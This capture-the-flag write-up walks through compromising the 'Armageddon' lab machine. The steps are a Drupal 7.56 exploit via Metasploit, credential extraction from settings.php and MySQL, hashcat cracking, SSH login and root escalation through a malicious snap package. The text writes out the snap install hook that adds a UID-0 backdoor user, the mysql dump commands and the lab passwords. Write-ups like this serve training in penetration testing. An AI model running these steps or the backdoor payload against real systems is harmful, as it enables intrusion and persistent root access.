
# Armageddon

### Basic Information
Machine name: Armageddon  
IP: 10.10.10.233  
Written by: Adir Biran  
Date: 23.11.2021

## Enumeration
#### Nmap






<p align="center">
<img width="380" alt="1-nmap" src="https://user-images.githubusercontent.com/21021400/143077270-269bbe39-56ac-467c-b6cf-d18598540dc7.png">
</p>

#### Gobuster
<p align="center">
<img width="381" alt="2-gobuster" src="https://user-images.githubusercontent.com/21021400/143077272-c05986c6-2363-443f-b6a4-0def48bbce9e.png">
</p>

manually checking the site
robots.txt
<p align="center">
<img width="253" alt="3-robots" src="https://user-images.githubusercontent.com/21021400/143077273-21541403-d9a3-4513-aea4-a314a0e867b2.png">
</p>

changelog file
http://10.10.10.233/CHANGELOG.txt
<p align="center">
<img width="307" alt="4-changelog" src="https://user-images.githubusercontent.com/21021400/143077279-cf7102f7-f05e-40cc-b50d-1c46a1cea44c.png">
</p>

drupal 7.56

install.php, cron.php, update.php unreachable


<p align="center">
<img width="233" alt="4-1-sites-default" src="https://user-images.githubusercontent.com/21021400/143077276-89711a37-2fdd-4352-9844-7799687e7b0a.png">
</p>
<p align="center">
<img width="244" alt="4-2-includes" src="https://user-images.githubusercontent.com/21021400/143077277-feb414f0-e593-4f73-8ac0-00c78623ad7e.png">
</p>

## Exploitation

searchsploit drupal 7.56
<p align="center">
<img width="496" alt="5-searchsploit" src="https://user-images.githubusercontent.com/21021400/143077281-963ca05f-ff49-4c01-a70a-4e3fd2720858.png">
</p>
metasploit search drupal
<img width="561" alt="6-metasploitsearch" src="https://user-images.githubusercontent.com/21021400/143077285-2b3bdb33-9dd8-4530-bba4-44f1d6706269.png">
<p align="center">
</p>
using the second on the list (index number 1)
<p align="center">
<img width="210" alt="7-metasploituse" src="https://user-images.githubusercontent.com/21021400/143077288-6bba7889-4204-4795-bf14-ae41ba1c0033.png">
</p>
setting rhosts, lhost
run
<p align="center">
<img width="415" alt="8-shellapache" src="https://user-images.githubusercontent.com/21021400/143077290-f0b6e38a-1e69-4d72-822a-56540fee7487.png">
</p>

## Privilege Escalation (apache -> brucetherealadmin)

trying to get into brucetherealadmin user
<p align="center">
<img width="277" alt="9-passwdfile" src="https://user-images.githubusercontent.com/21021400/143077291-c65e4ee1-0ade-4df6-bc7d-59c256e6dca3.png">
</p>
navigating to the sites/default directory from earlier
copying the content of settings.php to the local machine for easier investigation.
getting relevant information from the file using:
cat settings.php | grep -A 10 -B 10 password
(10 lines before and after each occurence of the word "password")
<p align="center">
<img width="163" alt="10-dblogin" src="https://user-images.githubusercontent.com/21021400/143077292-876354fc-b9b8-43a0-8dc9-927b3a4ff784.png">
</p>
user: drupaluser
password: CQHEy@9M*m23gBVj



terminal is non-interactive, better shown results with inline commands.

show the databases
mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e "show databases;"
<p align="center">
<img width="254" alt="11-db" src="https://user-images.githubusercontent.com/21021400/143077295-59554739-c8e0-47bb-b992-a4270c276950.png">
</p>

show the tables
mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e "use drupal; show tables;"
<p align="center">
<img width="121" alt="12-db" src="https://user-images.githubusercontent.com/21021400/143077298-f284822b-e20a-474b-ab92-eda11e3f2761.png">
</p>

show all users table
mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e "use drupal; select * from users;"
<p align="center">
<img width="502" alt="13-db" src="https://user-images.githubusercontent.com/21021400/143077301-0e5ec62b-11b8-407c-8304-3bc2d3e5db6c.png">
</p>

show only name and password from users table
mysql -u drupaluser -p'CQHEy@9M*m23gBVj' -e "use drupal; select name,pass from users;"
<p align="center">
<img width="348" alt="14-db" src="https://user-images.githubusercontent.com/21021400/143077303-007a13bc-bc6f-4586-95d3-0349b53f9bd7.png">
</p>

user: brucetherealadmin
password: $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt

assuming the user might reuse passwords, we will try to crack it using hashcat.
check the hash type on:
https://hashcat.net/wiki/doku.php?id=example_hashes
<p align="center">
<img width="778" alt="15-hashtypes" src="https://user-images.githubusercontent.com/21021400/143077238-82a8e5e8-b04f-4679-96a5-118ffcd5473b.png">
</p>

hashtype is drupal 7, code 7900 for hashcat.
copied the hash to a "hash" file and using rockyou password list with hashcat
<p align="center">
<img width="226" alt="16-hashcatcommand" src="https://user-images.githubusercontent.com/21021400/143077244-d745d062-e667-4cae-8f45-5fb706117a49.png">
</p>

after a short time we get a hit
<p align="center">
<img width="258" alt="17-hashcatresults" src="https://user-images.githubusercontent.com/21021400/143077246-2d33ef3c-6f64-4d0a-8ff0-a74154069ad9.png">
</p>

trying login to ssh with the credentials we got.
<p align="center">
<img width="222" alt="18-sshlogin" src="https://user-images.githubusercontent.com/21021400/143077248-55a79328-0686-408e-add6-1f0100e399bf.png">
</p>

## Privilege Escalation (brucetherealadmin -> root)


lets check sudo -l
<p align="center">
<img width="877" alt="19-sudol" src="https://user-images.githubusercontent.com/21021400/143077250-7c775676-41d6-4930-a8fe-2134eec42c6e.png">
</p>

we can run snap as root with the install * arguments.

checking on gtfobins how we can abuse it:
<p align="center">
<img width="630" alt="20-gtfobins" src="https://user-images.githubusercontent.com/21021400/143077252-38470c6f-939b-41a5-9e85-434fe4ec2dac.png">
</p>

in addition, a research in google lead to this article about exploiting snap with sudo permissions:
https://blog.ikuamike.io/posts/2021/package_managers_privesc/#exploitation-snap

on the local machine:
install snap by typing the following command:
gem install snap

create the following directories using mkdir with -p flag:
snap/meta/hooks
<p align="center">
<img width="121" alt="21-mkdir" src="https://user-images.githubusercontent.com/21021400/143077255-204a4fcf-64d0-482a-b96e-1bb2f0a59901.png">
</p>

create a file named "install" in the hooks directory with the following content:
#!/bin/bash
/usr/sbin/useradd -p $(openssl passwd -1 pass) -u 0 -o -s /bin/bash -m myroot
<p align="center">
<img width="313" alt="22-installcontent" src="https://user-images.githubusercontent.com/21021400/143077256-ddc8569e-785e-446b-8158-8ac2f00f85eb.png">
</p>

this script, when will be executed later by the victim's machine's root user, will add a new user named "myroot" with the "pass" password.

changing the install file permissions to be executable.
<p align="center">
<img width="152" alt="23-installpermissions" src="https://user-images.githubusercontent.com/21021400/143077258-d70674d8-ffeb-48d5-9d73-71578d009033.png">
</p>

inside the snap directory:
type the following command to generate a snap package of the install file:
fpm -n xxxx -s dir -t snap -a all meta
<p align="center">
<img width="180" alt="24-snapfpm" src="https://user-images.githubusercontent.com/21021400/143077260-ab89d28a-16a6-465b-99a6-909e5b1f91e3.png">
</p>

when finished a snap file will be generated:
<p align="center">
<img width="101" alt="25-snapfile" src="https://user-images.githubusercontent.com/21021400/143077262-2de41afb-054d-41e3-ba31-8b1beca7128c.png">
</p>

and now we'll transfer that snap file to the victim's machine.
since wget is disabled we will use curl instead.
<p align="center">
<img width="812" alt="26-downloadsnap" src="https://user-images.githubusercontent.com/21021400/143077264-834c1724-4a60-43c8-8b48-75d35acc146f.png">
</p>

executing the snap file using the command:
sudo -u root /usr/bin/snap install exploit.snap --dangerous --devmode
<p align="center">
<img width="425" alt="27-executesnap" src="https://user-images.githubusercontent.com/21021400/143077266-8b602477-8232-43db-8719-7061d0248797.png">
</p>

after a few seconds when execution is done, checking the /etc/passwd file for the new user:
<p align="center">
<img width="277" alt="28-newuser" src="https://user-images.githubusercontent.com/21021400/143077267-515fc704-d60b-4f9d-b28d-cc8ea2b519ed.png">
</p>

lets login now using the new credentials:
myroot:pass

<p align="center">
<img width="446" alt="29-root" src="https://user-images.githubusercontent.com/21021400/143077269-f44fc97d-c0c4-4f2d-980a-178b010d4aff.png">
</p>

and we're root.
